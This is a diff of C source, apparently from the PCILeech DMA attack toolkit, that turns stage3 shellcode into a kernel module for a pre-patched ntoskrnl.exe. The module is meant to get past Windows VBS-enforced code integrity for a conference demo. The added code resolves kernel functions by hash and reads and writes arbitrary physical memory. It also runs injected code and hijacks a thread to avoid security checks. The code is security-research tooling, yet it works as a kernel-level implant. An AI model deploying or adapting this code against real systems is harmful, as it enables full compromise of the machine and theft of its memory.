@@ -1,7 +1,14 @@
-// wx64_stage3_c.c : stage3 main shellcode.
+// uefi_winload_ntos_kmd_c.c : special kmd for use in pre-patched ntoskrnl.exe with VBS enforced code integrity
 //
-// (c) Ulf Frisk, 2016, 2017
+// (planned to be used in demo at 34c3)
+//
+// (c) Ulf Frisk, 2017
 // Author: Ulf Frisk, pcileech@frizk.net
+//
+// compile with:
+// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel uefi_winload_ntos_kmd_c.c
+// ml64.exe uefi_winload_ntos_kmd.asm /Feuefi_winload_ntos_kmd.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main uefi_winload_ntos_kmd_c.obj
+// shellcode64.exe -o uefi_winload_ntos_kmd.exe
 //
 #include <windows.h>
 #pragma warning( disable : 4047 4055 4127)
@@ -19,7 +26,7 @@ typedef CLIENT_ID *PCLIENT_ID;
 
 typedef _IRQL_requires_same_ _Function_class_(KSTART_ROUTINE) VOID KSTART_ROUTINE(
 	_In_ PVOID StartContext
-	);
+);
 typedef KSTART_ROUTINE *PKSTART_ROUTINE;
 
 typedef struct _UNICODE_STRING {
@@ -75,10 +82,12 @@ typedef enum _MODE {
 #define H_RtlZeroMemory							0xc53d4fdb
 #define H_ZwProtectVirtualMemory				0xbc3f4d89
 #define H_KeDelayExecutionThread				0x58586d92
+#define H_RtlZeroMemory							0xc53d4fdb
 
 // ----------------------------- SHELLCODE DEFINES AND TYPEDEFS BELOW (STAGE2) -----------------------------
 
 #undef RtlCopyMemory
+#undef RtlZeroMemory
 typedef struct tdNTOS {
 	VOID(*ExFreePool)(
 		_In_ PVOID P
@@ -135,6 +144,7 @@ typedef struct tdNTOS {
 } NTOS, *PNTOS;
 
 #define KMDDATA_OPERATING_SYSTEM_WINDOWS		0x01
+#define KMDDATA_MAGIC							0xff11337711333377
 
 /*
 * KMD DATA struct. This struct must be contained in a 4096 byte section (page).
@@ -174,8 +184,6 @@ typedef struct tdKMDDATA {
 	QWORD ReservedFutureUse4[255];	// [0x800]
 	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
 } KMDDATA, *PKMDDATA;
-
-VOID stage3_c_MainCommandLoop(PKMDDATA pk);
 
 // ----------------------------- SHELLCODE FUNCTIONS BELOW (STAGE2) -----------------------------
 
@@ -220,34 +228,6 @@ QWORD PEGetProcAddressH(_In_ QWORD hModule, _In_ DWORD dwProcNameH)
 	return 0;
 }
 
-/*
-* C entry point of the stage3 code.
-*/
-VOID stage3_c_EntryPoint(PKMDDATA pk)
-{
-	pk->MAGIC = 0x0ff11337711333377;
-	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_WINDOWS;
-	DWORD i = 0, NAMES[32];
-	NAMES[i++] = H_ExFreePool;
-	NAMES[i++] = H_MmFreeContiguousMemory;
-	NAMES[i++] = H_MmAllocateContiguousMemory;
-	NAMES[i++] = H_MmGetPhysicalAddress;
-	NAMES[i++] = H_MmGetPhysicalMemoryRanges;
-	NAMES[i++] = H_MmMapIoSpace;
-	NAMES[i++] = H_MmUnmapIoSpace;
-	NAMES[i++] = H_PsCreateSystemThread;
-	NAMES[i++] = H_RtlCopyMemory;
-	NAMES[i++] = H_ZwProtectVirtualMemory;
-	NAMES[i++] = H_KeDelayExecutionThread;
-	while(i) {
-		i--;
-		*((PQWORD)&pk->fn + i) = PEGetProcAddressH(pk->AddrKernelBase, NAMES[i]);
-	}
-	stage3_c_MainCommandLoop(pk);
-}
-
-// ----------------------------- SHELLCODE FUNCTIONS BELOW (STAGE2 - THREAD START) -----------------------------
-
 #define KMD_CMD_VOID			0xffff
 #define KMD_CMD_COMPLETED		0
 #define KMD_CMD_READ			1
@@ -276,8 +256,8 @@ VOID stage3_c_MainCommandLoop(PKMDDATA pk)
 {
 	LONGLONG llTimeToWait = -10000; // 1000 uS (negative multiples of 100ns)
 	PVOID pvBufferOutDMA;
-	PVOID pvMM = NULL;
 	PPHYSICAL_MEMORY_RANGE pMemMap;
+	PVOID pvMM = NULL;
 	QWORD i, idleCount = 0;
 	// 1: set up mem out dma area 16MB//4MB in lower 4GB
 	pk->DMASizeBuffer = 0x1000000;
@@ -328,11 +308,22 @@ VOID stage3_c_MainCommandLoop(PKMDDATA pk)
 			}
 		}
 		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
-			((VOID(*)(_In_ PKMDDATA pk, _In_ PQWORD dataIn, _Out_ PQWORD dataOut))pvBufferOutDMA)(pk, pk->dataIn, pk->dataOut);
-			pk->_result = TRUE;
+			if(pk->dataIn[9]) {
+				// PSCMD_KERNEL
+				((VOID(*)(PKMDDATA))pk->ReservedKMD[1])(pk);
+				pk->_result = TRUE;
+			} else {
+				// VFS
+				((VOID(*)(PKMDDATA))pk->ReservedKMD[0])(pk);
+				pk->_result = TRUE;
+			}
 		}
 		if(KMD_CMD_READ == pk->_op || KMD_CMD_WRITE == pk->_op) { // PHYSICAL MEMORY READ/WRITE
-			pvMM = pk->fn.MmMapIoSpace(pk->_address, pk->_size, 0);
+			if(pk->dataIn[9] == 0) {
+				pvMM = NULL; // no memory read if vfs (might crash the system accidentally)
+			} else {
+				pvMM = pk->fn.MmMapIoSpace(pk->_address, pk->_size, 0);
+			}
 			if(pvMM) {
 				if(KMD_CMD_READ == pk->_op) { // READ
 					pk->fn.RtlCopyMemory(pvBufferOutDMA, pvMM, pk->_size);
@@ -356,4 +347,85 @@ VOID stage3_c_MainCommandLoop(PKMDDATA pk)
 		pk->_op = KMD_CMD_COMPLETED;
 		idleCount = 0;
 	}
+}
+
+#define DATA_OFFSET_TRIGGER_COUNT	0x02
+#define DATA_OFFSET_KMD_THIS		0x08
+#define DATA_OFFSET_VFS				0x0c
+#define DATA_OFFSET_PSCMD_KERNEL	0x10
+#define DATA_OFFSET_PSCMD_USER		0x14
+VOID c_EntryPoint_Thread(QWORD qwAddrNtosBase, QWORD qwAddrKmdBase)
+{
+	PVOID(*MmMapIoSpace)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE);
+	VOID(*MmUnmapIoSpace)(PVOID, SIZE_T);
+	PVOID(*MmAllocateContiguousMemory)(SIZE_T, PHYSICAL_ADDRESS);
+	PHYSICAL_ADDRESS(*MmGetPhysicalAddress)(PVOID);
+	VOID(*RtlZeroMemory)(PVOID, SIZE_T);
+	PVOID pvKMD, pvPA1000;
+	PKMDDATA pk;
+	DWORD i = 0, NAMES[32];
+	QWORD vaAddrZero;
+	MmMapIoSpace = (PVOID(*)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE))PEGetProcAddressH(qwAddrNtosBase, H_MmMapIoSpace);
+	MmUnmapIoSpace = (VOID(*)(PVOID, SIZE_T))PEGetProcAddressH(qwAddrNtosBase, H_MmUnmapIoSpace);
+	MmAllocateContiguousMemory = (PVOID(*)(SIZE_T, PHYSICAL_ADDRESS))PEGetProcAddressH(qwAddrNtosBase, H_MmAllocateContiguousMemory);
+	MmGetPhysicalAddress = (PHYSICAL_ADDRESS(*)(PVOID))PEGetProcAddressH(qwAddrNtosBase, H_MmGetPhysicalAddress);
+	RtlZeroMemory = (VOID(*)(PVOID, SIZE_T))PEGetProcAddressH(qwAddrNtosBase, H_RtlZeroMemory);
+	pvKMD = MmMapIoSpace(0x3000, 0x1000, 0);
+	if(!pvKMD) { return; }
+	RtlZeroMemory(pvKMD, 0x1000);
+	pk = (PKMDDATA)pvKMD;
+	pk->AddrKernelBase = qwAddrNtosBase;
+	pk->MAGIC = 0x0ff11337711333377;
+	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_WINDOWS;
+	vaAddrZero = qwAddrKmdBase - *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_KMD_THIS);
+	pk->ReservedKMD[0] = vaAddrZero + *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_VFS);
+	pk->ReservedKMD[1] = vaAddrZero + *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_PSCMD_KERNEL);
+	pk->ReservedKMD[2] = vaAddrZero + *(PDWORD)(qwAddrKmdBase + DATA_OFFSET_PSCMD_USER);
+	NAMES[i++] = H_ExFreePool;
+	NAMES[i++] = H_MmFreeContiguousMemory;
+	NAMES[i++] = H_MmAllocateContiguousMemory;
+	NAMES[i++] = H_MmGetPhysicalAddress;
+	NAMES[i++] = H_MmGetPhysicalMemoryRanges;
+	NAMES[i++] = H_MmMapIoSpace;
+	NAMES[i++] = H_MmUnmapIoSpace;
+	NAMES[i++] = H_PsCreateSystemThread;
+	NAMES[i++] = H_RtlCopyMemory;
+	NAMES[i++] = H_ZwProtectVirtualMemory;
+	NAMES[i++] = H_KeDelayExecutionThread;
+	while(i) {
+		i--;
+		*((PQWORD)&pk->fn + i) = PEGetProcAddressH(pk->AddrKernelBase, NAMES[i]);
+	}
+	pvPA1000 = MmMapIoSpace(0x1000, 0x1000, 0);
+	*(PQWORD)((QWORD)pvPA1000 + 0xc0) = MmGetPhysicalAddress(pvKMD);
+	*(PQWORD)((QWORD)pvPA1000 + 0xb0) = KMDDATA_MAGIC;
+	MmUnmapIoSpace(pvPA1000, 0x1000);
+	stage3_c_MainCommandLoop(pk);
+}
+
+VOID c_EntryPoint(QWORD qwAddrNtosBase, QWORD qwAddrKmdBase, QWORD qwCR3)
+{
+	PVOID(*MmMapIoSpace)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE);
+	VOID(*MmUnmapIoSpace)(PVOID, SIZE_T);
+	PVOID pvPA1000;
+	QWORD count;
+	WORD cTrigger;
+	MmMapIoSpace = (PVOID(*)(PHYSICAL_ADDRESS, SIZE_T, MEMORY_CACHING_TYPE))PEGetProcAddressH(qwAddrNtosBase, H_MmMapIoSpace);
+	MmUnmapIoSpace = (VOID(*)(PVOID, SIZE_T))PEGetProcAddressH(qwAddrNtosBase, H_MmUnmapIoSpace);
+	pvPA1000 = MmMapIoSpace(0x1000, 0x1000, 0);
+	if(!pvPA1000) { return; }
+	if((*(PQWORD)((QWORD)pvPA1000 + 0xa0) == qwCR3)) {
+		cTrigger = *(PWORD)(qwAddrKmdBase + DATA_OFFSET_TRIGGER_COUNT);
+		count = *(PQWORD)((QWORD)pvPA1000 + 0xb8) = *(PQWORD)((QWORD)pvPA1000 + 0xb8) + 1;
+		if(count == cTrigger) {
+			MmUnmapIoSpace(pvPA1000, 0x1000);
+			//INFO: it seems like we cannot create system thread due to security checks
+			//PsCreateSystemThread = (NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE, PCLIENT_ID, PKSTART_ROUTINE, PVOID))PEGetProcAddressH(qwAddrNtosBase, H_PsCreateSystemThread);
+			//PsCreateSystemThread(&hThread, 0x1ffff, NULL, NULL, NULL, (PKSTART_ROUTINE)c_EntryPoint_Thread, (PVOID)qwAddrNtosBase);
+			//INFO: hijack is fine with 'security' though =P			
+			c_EntryPoint_Thread(qwAddrNtosBase, qwAddrKmdBase);
+			return;
+		}
+	}
+	MmUnmapIoSpace(pvPA1000, 0x1000);
 }
